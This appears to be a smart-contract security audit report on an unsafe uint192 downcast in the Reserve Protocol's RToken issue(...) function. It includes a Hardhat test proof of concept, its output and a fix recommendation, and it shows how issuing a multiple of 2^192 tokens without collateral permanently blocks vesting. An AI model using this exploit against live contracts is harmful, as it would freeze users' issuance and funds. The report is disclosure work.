# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L230-L243   # Vulnerability details  ## Unsafe downcasting in `issue(...)` can be exploited to cause permanent DoS  #### Important note! I first found this bug in `issue(...)` at first, but unsafe downcasting appears in many other areas of the codebase, and seem to also be exploitable but no PoC is provided due to time constraints. Either way, using some form of safe casting library to **replace all occurences** of unsafe downcasting will prevent all the issues. I also do not list the individual instances of unsafe downcasting as all occurences should be replaced with safe cast.  ### Details The `amtRToken` is a user supplied parameter in the `issue(uint256 amtRToken)` function ```sol uint192 amtBaskets = uint192(  totalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) : amtRToken ); ``` The calculated amount is unsafely downcasted into `uint192`.  This means that if the resulting calculation is a multiple of $2^{192}$, `amtBaskets = 0`  The code proceeds to the following line, where `erc20s` and `deposits` arrays will be empty since we are asking for a quote for 0. (see `quote(...)` in `BasketHandler.sol` where amounts are multiplied by zero) ```sol (address[] memory erc20s, uint256[] memory deposits) = basketHandler.quote(             amtBaskets,             CEIL         ); ``` This means an attacker can call `issue(...)` with a very high `amtRToken` amount that is a multiple of $2^{192}$, without depositing any amount of collateral.  The DoS issues arises because `whenFinished(uint256 amtRToken)` is dependent on `amtRToken`. With such a high value, `allVestAt` will be set so far in the future that it causes a permanent DoS. i.e. Issuances will never vest. ```sol uint192 vestingEnd = whenFinished(amtRToken); // D18{block number} ```  ### Proof of Concept This PoC demonstrates that an attacker can call `issue(...)` without collateral tokens to modify `allVestAt` variable to an extreme value, such that all further issuances cannot be vested for all users.  Do note that the PoC is done with `totalSupply() == 0` case, so we supply `amtRToken` as a multiple of $2^{192}$. Even if there is an existing `totalSupply()`, we just need to calculate a value for `amtRToken >= 2^192` such that $\frac{\text{basketsNeeded} \times \text{amtRToken}}{totalSupply()} = 0$. This attack does not require `totalSupply()` be zero.  ```sol uint192 amtBaskets = uint192(  totalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) : amtRToken ); ```  The `amount`, `baskets` and `quantities` values are also messed up, but it would not matter anyways...  Under 'Issuance and Slow Minting' tests in `RToken.test.ts`: ```sol it('Audit: DoS by downcasting', async function () {       const issueAmount: BigNumber = BigNumber.from(2n ** 192n)        // Set basket       await basketHandler.connect(owner).setPrimeBasket([token0.address], [fp('1')])       await basketHandler.connect(owner).refreshBasket()        // Attacker issues 2 ** 192, or a multiple of 2 ** 192 RTokens       // This will cause allVestAt to be veryyyyy high, permanent DoS       const tx = await rToken.connect(addr1)['issue(uint256)'](issueAmount)       const receipt = await tx.wait()       console.log(receipt.events[0].args)          await token0.connect(addr2).approve(rToken.address, initialBal)       const tx2 = await rToken.connect(addr2)['issue(uint256)'](initialBal)       const receipt2 = await tx2.wait()       console.log(receipt2.events[0].args)        // one eternity later...       await advanceTime('123456789123456789')       // and still not ready       await expect(rToken.connect(addr2).vest(addr2.address, 1))         .to.be.revertedWith("issuance not ready")      }) ``` Run with: ```bash yarn test:p1 --grep "Audit: DoS" ``` Expect to see (only important parts shown): ```bash [   ...   recipient: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',   index: BigNumber { value: "0" },   amount: BigNumber { value: "6277101735386680763835789423207666416102355444464034512896" },   baskets: BigNumber { value: "0" },   erc20s: [ '0x998abeb3E57409262aE5b751f60747921B33613E' ],   quantities: [ BigNumber { value: "0" } ],   blockAvailableAt: BigNumber { value: "627710173538668076383578942320766744610235544446403452" } ] [   ...   recipient: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',   index: BigNumber { value: "0" },   amount: BigNumber { value: "6300000000000000000000000000000000000000000000000000000000" },   baskets: BigNumber { value: "22898264613319236164210576792333583897644555535965487104" },   erc20s: [ '0x998abeb3E57409262aE5b751f60747921B33613E' ],   quantities: [     BigNumber { value: "22898264613319236164210576792333583897644555535965487104" }   ],   blockAvailableAt: BigNumber { value: "1257710173538668076383578942320766744610235544446403452" } ]    RTokenP1 contract     Issuance and Slow Minting       âœ” Audit: DoS by downcasting ```  ### Impact Permanent DoS would be High risk considering RToken is an asset-backed **currency**. _A currency that is unable to issue new currency does not work as a currency_  Also, I believe existing collateral cannot be redeemed due to the extreme values also used in `redeem(...)` function. No PoC written due to time constriant for this case... but above should be enough impact.  Many other downcasting issues for this project. But using a safe casting library would prevent all the issues... not going to write multiple reports for same underlying issue.  ### Recommendations Use some safe casting library. OpenZeppelin's library does not have safe casting for `uint192` type. May have to find another or write your own.
